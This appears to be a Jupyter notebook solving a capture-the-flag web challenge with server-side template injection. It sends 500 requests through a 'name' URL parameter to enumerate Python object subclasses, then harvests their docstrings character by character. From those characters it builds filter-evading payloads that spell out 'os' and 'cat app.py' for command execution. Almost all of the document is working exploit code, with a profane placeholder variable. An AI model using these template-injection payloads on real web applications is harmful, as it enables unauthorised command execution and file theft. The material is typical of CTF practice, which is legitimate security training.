```python
from tqdm.notebook import *
from html.parser import HTMLParser  
import requests
import utfc.StrFunc as sf
hp =  HTMLParser()
```

```python
url='http://e32fefd8-e66b-4bfe-a9c0-5fe565d77c6c.chall.ctf.show/?name={{fucker}}'

kwdi=[]
'config.__class__.__init__.__globals__[]'

for i in trange(500) :
    uc = url.replace('fucker','{}.__class__.__base__.__subclasses__().__getitem__(%d).__doc__'%i)
#     print(uc)
    html = requests.get(uc).text
    html = sf.CharF.mask(html,'<h3>','</h3>')
    kwdi.append(hp.unescape(html))


```

```python
xx = '[].__class__.__base__.__subclasses__()[22].__doc__[183:185]'
def findchr(c='o'):
    for i in range(len(kwdi)):
        if c in  kwdi[i]: 
            return '{}.__class__.__base__.__subclasses__().__getitem__(%d).__doc__.__getitem__(%d)'%(i,kwdi[i].find(c))
    else:
        return "++++++++++++++++++++++++++++"
def findstr(s='os'):
    rt=findchr(s[0])
    for i in s[1:]:
        rt+=".__add__("+findchr(i)+')'
    return rt
print(findstr('cat app.py'))
print(findstr('os'))
```
